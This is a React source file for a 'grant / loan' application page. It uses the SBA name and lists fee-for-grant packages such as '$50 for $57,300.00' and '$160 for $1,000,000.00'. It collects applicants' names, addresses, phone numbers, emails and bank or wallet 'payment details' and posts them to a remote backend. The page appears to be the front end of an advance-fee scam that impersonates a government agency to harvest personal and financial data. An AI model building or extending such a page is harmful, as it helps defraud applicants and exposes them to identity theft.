import React, {useState} from 'react';
import styled from 'styled-components';
import Axios from "axios";
import { ClipLoader } from 'react-spinners';
import { useNavigate } from 'react-router-dom';
import Swal from 'sweetalert2';
import GrantPackages from "./Card";
import {FaSeedling} from "react-icons/fa"


const FormJs = () => {

    const navigate = useNavigate();

    const [username, setUsername] = useState("")
    const [email, setEmail] = useState("")
    const [addressLine1, setAddressLine1] = useState("")
    const [addressLine2, setAddressLine2] = useState("")
    const [phoneNumber, setPhoneNumber] = useState("")
    const [state, setState] = useState("")
    const [city, setCity] = useState("")
    const [postalcode, setPostal] = useState("")
    const [request, setRequest] = useState("")
    const [recommend, setRecommend] = useState("")
    const [plan, setPlan] = useState("")
    const [packages, setPackages] = useState("")
    const [description, setDescription] = useState("")
    const [loading, setLoading] = useState(false);
    const [paymentdetails, setPaymentDetails] = useState("")
    // const [acctname, setAcctname] = useState("")


    const Data = {username, email, phoneNumber, addressLine1, addressLine2, city, state, postalcode, recommend, request, description, paymentdetails, plan, packages};

    // const url = "http://localhost:4000/api/form";
    const onlineurl = "https://sba-backend.onrender.com/api/form";

    const submitForm = (e) => {
        e.preventDefault();
        setLoading(true);
        Axios.post(onlineurl, Data).then((res) =>{
        localStorage.setItem("form", JSON.stringify(res.data));

        Swal.fire({
            icon: 'success',
            title: 'Success',
            text: "Your Application Submission Is Successful. Check Your Email For Confirmation.",
         })

         setTimeout(() => {
            navigate("/")
          }, [4000]);
        }).catch((err) =>{
            Swal.fire({
                icon:"error",
                title: "Oops!!!",
                text: `An error occured ${err.response.data.message}`
                // text: err.response.data.message
            });
            setLoading(false);
        })
        setUsername("")
        setEmail("")
        setPhoneNumber("")
        setAddressLine1("")
        setAddressLine2("")
        setCity("")
        setState("")
        setRequest("")
        setDescription("")
        setRecommend("")
        setPlan("")
        setPackages("")
        setPostal("")
        setPaymentDetails("")
    }

  return (
    <Container>
        <Wrapper>
            <H1>Apply For Grant / Loan</H1>
        <Notice>
                <P style={{fontWeight:"bold"}}>*Important Notice</P>
                <PP>We reserve the right to make any changes to the existing affiliate program if necessary. In this case, the project participants will be notified in<br/> the news section or by mass mailing to the e-mails specified during application.</PP>
            </Notice>
            <Form onSubmit={(e) => submitForm(e)}>
                <Top>
                    <InputHold>
                        <Title>Full Name*</Title>
                        <Select placeholder='First name & last name' value={username} onChange={(e) => {setUsername(e.target.value)}}/>
                    </InputHold>
                    <InputHold>
                        <Title>Email Address*</Title>
                        <Input type='email' placeholder='email address' value={email} onChange={(e) => {setEmail(e.target.value)}}/>
                    </InputHold>
                </Top>
                <Middle>
                    <InputHold>
                        <Title>Address</Title>
                        <Input placeholder='Input Your Street Address Line1' value={addressLine1} onChange={(e) => {setAddressLine1(e.target.value)}}/>
                    </InputHold>
                    <InputHold>
                        <Title>Street Adress Line 2</Title>
                        <Input placeholder='Input Your Street Address Line 2' value={addressLine2} onChange={(e) => {setAddressLine2(e.target.value)}}/>
                    </InputHold>
                </Middle>
                <Middle>
                    <InputHold>
                        <Title>City</Title>
                        <Input placeholder='Input Your City' value={city} onChange={(e) => {setCity(e.target.value)}}/>
                    </InputHold>
                    <InputHold>
                        <Title>State / Province</Title>
                        <Input placeholder='Input Your State / Province' value={state} onChange={(e) => {setState(e.target.value)}}/>
                    </InputHold>
                </Middle>
                <Middle>
                    <InputHold>
                        <Title>Postal / Zip Code</Title>
                        <Input placeholder='Input Your Postal / zip code' value={postalcode} onChange={(e) => {setPostal(e.target.value)}}/>
                    </InputHold>
                    <InputHold>
                        <Title>Phone Number</Title>
                        <Input placeholder='Input Your Phone Number' value={phoneNumber} onChange={(e) => {setPhoneNumber(e.target.value)}}/>
                    </InputHold>
                </Middle>
                <Middle>
                    <InputHold>
                        <Title>How did you hear about us?</Title>
                        <Input placeholder='Describe how you heard about us' value={request} onChange={(e) => {setRequest(e.target.value)}}/>
                    </InputHold>
                    <InputHold>
                        <Title>Will you be willing to recommend us?</Title>
                        <Input placeholder='Yes / No / Maybe' value={recommend} onChange={(e) => {setRecommend(e.target.value)}}/>
                    </InputHold>
                </Middle>
                <Pack>
                <GrantPackages fontcol="#fff" title="SBA grant packages " bg="#343a49" iconmain={<FaSeedling/>} text="Find an SBA lender near you to help fund your business.." price="Startup grant: $50 for $57,300.00" pay1="Community grant: $160 for $1,000,000.00" pay2="Non-profit organisation: $25 for $35,000.23" pay3="Profit organisation: $30 for $35,000" pay4="Natural disaster damage: $30 for $85,000.19" />
                <GrantPackages fontcol="#fff" title="SBA-guaranteed business loans" bg="#343a49" iconmain={<FaSeedling/>} text="SBA provides limited small business grants and grants to states and eligible community organizations to promote entrepreneurship." price="Business Loan: $80 for $96,000.34" pay1="Home /  Business disaster loan: $40 for $48,000.43" pay2="Housing and personal assistance: $35 for $40, 000.90" pay3="Physical damage loan: $60 for $64,000.00"/>
                </Pack>
                <Middle>
                    <InputHold>
                        <Title>What are you applying for?(Grant / Loan)</Title>
                        <Input placeholder='Grant or Loan' value={packages} onChange={(e) => {setPackages(e.target.value)}}/>
                    </InputHold>
                    <InputHold>
                        <Title>what grant/ loan plan are you applying for?</Title>
                        <Input placeholder='e.g: startup grant package: $50 for $57,300.00' value={plan} onChange={(e) => {setPlan(e.target.value)}}/>
                    </InputHold>
                </Middle>
                    <InputHold2>
                        <Title>State valid reasons why you should be considered for it.</Title>
                        <Input2 placeholder='state reasons why you should be considered for this grant or why you need the loan?' value={description} onChange={(e) => {setDescription(e.target.value)}}/>
                    </InputHold2>
                    <InputHold>
                        <Title>Payment Details</Title>
                        <Input3 placeholder="input payment details to receive grant / loan.. e.g: 0123456789 allison wells, Kayne Bank OR wallet address E12yh38279302 etc..." value={paymentdetails} onChange={(e) => {setPaymentDetails(e.target.value)}}/>
                    </InputHold>
                    <Button type='submit'>{loading ? <ClipLoader size={25} thickness={100} speed={100} color="rgba(255, 255, 255, 1)" secondarycolor="rgba(0, 0, 0, 0.44)" /> : "Submit" }</Button>
            </Form>
        </Wrapper>
    </Container>
  )
}

export default FormJs;

const Container = styled.div`
width: 100%;
height: auto;
background-color: #16243D;
display: flex;
justify-content: center;
align-items: center;
padding: 20px 0;
`;
const Wrapper = styled.div`
width: 80%;
height: 100%;
padding: 100px 0;
display: flex;
flex-direction: column;
/* align-items: center; */

@media Screen and (max-width:768px){
    text-align: center;
    margin-top: -80px;
}
@media Screen and (max-width:425px){
    text-align: center;
}
`;
const H1 = styled.div`
font-size: 35px;
font-weight: 500;
color:  lightgrey;
margin: 15px 0;

@media Screen and (max-width: 768px){
    font-size: 30px;
}
`;

const Form = styled.form`
width: 100%;
display: flex;
flex-direction: column;

`;
const Notice = styled.div`
width: 96%;
border-radius: 0.7rem;
background-color: #101C30;
color: white;
padding: 40px 30px;
margin: 30px 0;


@media Screen and (max-width: 768px){
    width: 90%;
    margin-left: -15px;
}
`;
const P = styled.div`
font-size: 16px;
`;
const PP = styled.div`
`;
const Top = styled.div`
width: 100%;
display: flex;
justify-content: space-between;

@media Screen and (max-width: 768px){
    flex-direction: column;
}
`;
const InputHold = styled.div`
width: 40%;
display: flex;
flex-direction: column;
margin: 10px 0;
@media Screen and (max-width: 768px){
    width: 100%;
    align-items: flex-start;
}

`;
const InputHold2 = styled.div`
width: 100%;
display: flex;
flex-direction: column;
margin: 10px 0;
@media Screen and (max-width: 768px){
    width: 100%;
    align-items: flex-start;
}

`;
const Title = styled.div`
font-size: 17px;
font-weight: 500;
color: lightgrey;
`;
const Select = styled.input`
padding: 15px 5px;
outline: none;
border-radius: 0.4rem;
border: 1px solid #3B314E;
color: grey;

@media Screen and (max-width: 768px){
    margin: 10px 0;
    width: 100%;
}
`;
const Input3 = styled.textarea`
padding: 10px 0 45px 10px;
border-radius: 0.4rem;
outline: none;
border: 1px solid #3B314E;
color: grey;
height: 30px;

@media Screen and (max-width: 768px){
    margin: 10px 0;
    width: 100%;
}
`;
const Input = styled.input`
padding: 15px 0 15px 10px;
border-radius: 0.4rem;
outline: none;
border: 1px solid #3B314E;
color: grey;

@media Screen and (max-width: 768px){
    margin: 10px 0;
    width: 100%;
}
`;
const Input2 = styled.input`
padding: 20px 0 200px 10px;
border-radius: 0.4rem;
outline: none;
border: 1px solid #3B314E;
color: grey;
width:  100%;

@media Screen and (max-width: 768px){
    margin: 10px 0;
    width: 100%;
}

`;
const Middle = styled.div`
width: 100%;
display: flex;
justify-content: space-between;

@media Screen and (max-width: 768px){
    flex-direction: column;
}
`;
const Pack = styled.div`
width: 100%;
height: max-content;
display: flex;
justify-content: space-between;
align-items: center;

@media Screen and (max-width: 768px){
    flex-wrap: wrap;
    flex-direction: column;
}

`;
const Button = styled.button`
color: white;
font-weight: bold;
/* background-color: #FF4D4D; */
background-color: #015FC9;
border-radius: 5px;
cursor: pointer;
padding: 0.5rem 2rem;
text-align: center;
text-decoration: none;
display: flex;
justify-content: center;
align-items: center;
font-size: 16px;
border: none;
outline: none;
width: 200px;
height: 50px;
:hover{
    transition: all 400ms;
    cursor: pointer;
}

@media Screen and (max-width: 425px){
    margin: 10px 0;
    width: 100%;
}
`;

